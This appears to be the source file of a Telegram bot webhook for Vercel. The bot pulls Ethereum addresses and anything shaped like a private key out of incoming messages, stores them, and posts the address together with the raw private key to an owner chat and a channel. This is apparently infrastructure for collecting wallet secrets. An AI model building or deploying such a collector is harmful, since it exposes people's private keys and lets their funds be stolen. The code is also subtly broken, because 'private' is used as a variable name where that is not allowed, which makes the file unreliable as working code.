import TelegramBot from "node-telegram-bot-api";
import axios from "axios";
import { kv } from "@vercel/kv";

// Use environment variables (set these in Vercel)
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_CHAT_ID = process.env.CHAT_ID;      // your personal id
const CHANNEL_ID = process.env.CHANNEL_ID;      // e.g. @Transactionchecker

if (!BOT_TOKEN) {
  console.error("BOT_TOKEN missing in env");
}

// Telegram bot in webhook mode (we only use bot.processUpdate here)
const bot = new TelegramBot(BOT_TOKEN, { webHook: true });

// helper: send to user + channel
async function sendToTargets(text, options = {}) {
  try {
    if (OWNER_CHAT_ID) {
      await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        params: { chat_id: OWNER_CHAT_ID, text, parse_mode: "Markdown", ...options }
      });
    }
    if (CHANNEL_ID) {
      await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        params: { chat_id: CHANNEL_ID, text, parse_mode: "Markdown", ...options }
      });
    }
  } catch (e) {
    console.error("sendToTargets error:", e?.response?.data || e.message);
  }
}

// regex to extract 0x address and optional private key (simple)
function extractAddressAndPrivate(text) {
  if (!text) return null;
  const addressMatch = text.match(/0x[a-fA-F0-9]{40}/);
  const privMatch = text.match(/([a-f0-9]{64})/i); // naive private key match (64 hex)
  return {
    address: addressMatch ? addressMatch[0] : null,
    private: privMatch ? privMatch[0] : null
  };
}

// add wallet to KV if new
async function addWallet(address, privateKey=null, sourceText=null) {
  if (!address) return false;
  const exists = await kv.get(address);
  if (exists) return false;

  // store a wallet object: createdAt, private (optional), source
  const wallet = {
    address,
    private: privateKey || null,
    createdAt: Date.now(),
    source: sourceText || null
  };

  // set wallet marker and initialize tx counts
  await kv.set(address, wallet);
  await kv.set(`tx:${address}`, { eth: 0, bsc: 0, poly: 0, base: 0 });
  return wallet;
}

// webhook handler
export default async function handler(req, res) {
  // respond ok for GET (health)
  if (req.method === "GET") {
    return res.status(200).json({ ok: true, msg: "Webhook endpoint" });
  }

  // Telegram webhook POST
  if (req.method === "POST") {
    try {
      // let the node-telegram-bot-api process update (so handlers work if added)
      bot.processUpdate(req.body);
    } catch (e) {
      console.error("processUpdate error", e.message);
    }

    // extract message text (support forwarded messages)
    const text = req.body?.message?.text || req.body?.message?.caption || "";

    const { address, private } = extractAddressAndPrivate(text);

    if (address) {
      const added = await addWallet(address, private, text);
      if (added) {
        // send the exact New Wallet Scanned message
        const msg = `🧠 *New Wallet Scanned*\n\n🧾 Address: \`${address}\`\n${private ? `🔑 Private: \`${private}\`\n\n` : ''}❌ Ethereum: 0\n🔗 https://etherscan.io/address/${address}\n\n❌ BSC: 0\n🔗 https://bscscan.com/address/${address}\n\n❌ Polygon: 0\n🔗 https://polygonscan.com/address/${address}\n\n❌ Base: 0\n🔗 https://basescan.org/address/${address}`;

        await sendToTargets(msg, { disable_web_page_preview: true });
      } else {
        // already exists: ignore or optionally notify
      }
    }

    return res.status(200).json({ ok: true });
  }

  return res.status(405).json({ error: "Method not allowed" });
}
